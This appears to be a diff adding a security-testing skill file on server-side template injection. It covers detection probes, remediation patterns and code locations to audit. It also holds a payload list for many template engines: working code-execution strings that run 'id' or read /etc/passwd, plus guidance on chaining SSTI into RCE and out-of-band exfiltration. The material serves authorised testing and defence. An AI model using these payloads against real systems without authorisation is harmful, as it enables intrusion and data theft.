@@ -1,0 +1,111 @@
+---
+name: ssti
+description: Server-Side Template Injection testing covering Jinja2, Twig, Freemarker, Velocity, Thymeleaf, and more
+category: vulnerabilities
+version: "1.0"
+tags: ["ssti", "template-injection", "rce", "owasp-a01", "owasp-a03"]
+applies_to: ["Jinja2", "Twig", "Freemarker", "Velocity", "Thymeleaf", "Smarty", "Blade", "ERB", "Liquid", "Handlebars", "Mustache", "Pug", "EJS", "Nunjucks"]
+severity: "CRITICAL"
+confidence_threshold: "HIGH"
+---
+attack_surface:
+  - "Template-based email generation"
+  - "PDF/report generation from templates"
+  - "CMS page/template editors"
+  - "User-customizable dashboards"
+  - "Error pages with user input"
+  - "Internationalization (i18n) templates"
+  - "Code generation tools"
+  - "Dynamic config generation"
+
+detection_channels:
+  - "Mathematical evaluation: {{7*7}} → 49"
+  - "String concatenation: {{'test'}} → test"
+  - "Object property access: {{config}} → config dump"
+  - "Method execution: {{self.__class__.__mro__}} → class hierarchy"
+  - "Filter abuse: {{''.__class__.__mro__[2].__subclasses__()}}"
+  - "Blind SSTI: Time-based, out-of-band (DNS/HTTP)"
+  - "Error-based: Template syntax errors revealing engine"
+
+payload_primitives:
+  generic_math:
+    - "{{7*7}}"
+    - "${7*7}"
+    - "#{7*7}"
+    - "<%= 7*7 %>"
+    - "{7*7}"
+    - "${{7*7}}"
+    - "{{7*'7'}}"
+  jinja2:
+    - "{{config}}"
+    - "{{self.__class__.__mro__[2].__subclasses__()}}"
+    - "{{''.__class__.__mro__[2].__subclasses__()}}"
+    - "{{request.__class__.__mro__[2].__subclasses__()}}"
+    - "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}"
+    - "{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+    - "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+  twig:
+    - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+    - "{{['id']|filter('system')}}"
+    - "{{_context.__env.enableDebug()}}"
+  freemarker:
+    - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+    - "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+  velocity:
+    - "#set($str=$class.inspect(\"java.lang.String\").typeId)"
+    - "#set($chr=$class.inspect(\"java.lang.Character\").typeId)"
+    - "$str.valueOf($chr.toChars(100)).concat($str.valueOf($chr.toChars(105))).concat($str.valueOf($chr.toChars(114))).concat($str.valueOf($chr.toChars(101))).concat($str.valueOf($chr.toChars(99))).concat($str.valueOf($chr.toChars(116))).concat($str.valueOf($chr.toChars(40))).concat($str.valueOf($chr.toChars(34))).concat($str.valueOf($chr.toChars(105))).concat($str.valueOf($chr.toChars(100))).concat($str.valueOf($chr.toChars(34))).concat($str.valueOf($chr.toChars(41)))"
+  thymeleaf:
+    - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    - "${#request.get('T(java.lang.Runtime).getRuntime().exec(\"id\")')}"
+  smarty:
+    - "{php}system('id');{/php}"
+    - "{system('id')}"
+  blade:
+    - "{{php}}system('id');{{/php}}"
+    - "@php system('id'); @endphp"
+  erb:
+    - "<%= `id` %>"
+    - "<% system('id') %>"
+  liquid:
+    - "{{ \"id\" | execute }}"  # if custom filter
+  handlebars:
+    - "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.push \"return process.mainModule.require('child_process').execSync('id');\"}}{{this.push \"\"}}{{#each conslist}}{{#with this}}{{#with (lookup ../../../string.sub \"constructor\")}}{{#with call 0 1}}{{this}}{{/with}}{{/with}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}"
+
+false_positive_validation:
+  - "Verify mathematical expression evaluates (49 for 7*7)"
+  - "Confirm template engine identified via error messages"
+  - "Test RCE payload execution (not just template rendering)"
+  - "Check for sandbox bypass (restricted environments)"
+  - "Validate not client-side template (AngularJS, Vue, React)"
+  - "Confirm server-side execution via out-of-band"
+
+chaining_guidance:
+  - "SSTI + File Upload → Template file upload → RCE"
+  - "SSTI + SSRF → Internal template retrieval"
+  - "SSTI + Deserialization → Gadget chain"
+  - "SSTI + Path Traversal → Read template source"
+  - "Blind SSTI + OAST → Exfiltration without direct output"
+
+remediation_patterns:
+  - "Use sandboxed template engines (Jinja2 SandboxedEnvironment)"
+  - "Never allow user input in template source"
+  - "Use logic-less templates (Mustache, Handlebars) when possible"
+  - "Implement allowlist of allowed template functions/filters"
+  - "Compile templates ahead of time (no runtime compilation)"
+  - "Validate and sanitize all template variables"
+  - "Use separate template context per user/request"
+
+code_locations:
+  - "Search for template rendering with user input:"
+  - "  `render_template_string(user_input)`, `Template(user_input).render()`"
+  - "  `twig.render(user_input)`, `freemarker.process(user_input)`"
+  - "  `velocityEngine.evaluate(context, writer, \"\", user_input)`"
+  - "Find template loading from database/files: `db.template`, `file.template`"
+  - "Check for user-controlled template paths/names"
+  - "Identify i18n translation strings used as templates"
+
+references:
+  - "https://portswigger.net/web-security/server-side-template-injection"
+  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+  - "https://blog.portswigger.net/2015/08/server-side-template-injection.html"
